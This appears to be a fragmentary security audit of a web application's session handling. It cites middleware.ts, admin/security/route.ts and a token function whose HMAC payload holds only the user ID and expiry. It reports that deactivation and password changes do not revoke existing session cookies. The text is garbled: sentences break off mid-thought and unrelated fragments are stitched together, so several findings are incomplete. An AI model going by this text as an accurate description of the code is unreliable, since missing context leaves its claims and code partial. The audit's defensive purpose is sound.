      * /user-dashboard (middleware.ts:181-185) — a deactivated user's
        browser is NOT redirected to /user-login. It loads the dashboard
        page; the page then calls /api/user/verify which returns
        { ok:true, access:{ allowed:false, reason:"access_denied_inactive" } }.
        The UI must handle the degradation. There is no hard server-side
        session kill.

        browser passes the middleware format-check gate, then the API
        handler's checkAdminAuth re-reads the user and returns 401.
        So the request is rejected, but only after the middleware has
        waved the cookie through.

    user's other devices continue to send (still-valid) cookies until
    the 24h expiry. Each request hits the DB and is rejected, but the
    cookie is not invalidated.

    `data.active = false` and optionally `data.deactivatedReason`. It
    does NOT bump any session-version counter or wipe any session table

    export function createSessionToken(userId: string): string {
      const expiresAt = Date.now() + SESSION_DURATION_HOURS * 60 * 60 * 1000;
      const payload = `${userId}.${expiresAt}`;
      const sig = hmac(payload);

  admin/security/route.ts:87-91:

Analysis:

    `${userId}.${expiresAt}`. It contains NEITHER:

    changes their password.

    ("change your password to evict the attacker") INEFFECTIVE
    against this codebase.

    is to delete or deactivate the user entirely (admin/users/[id]
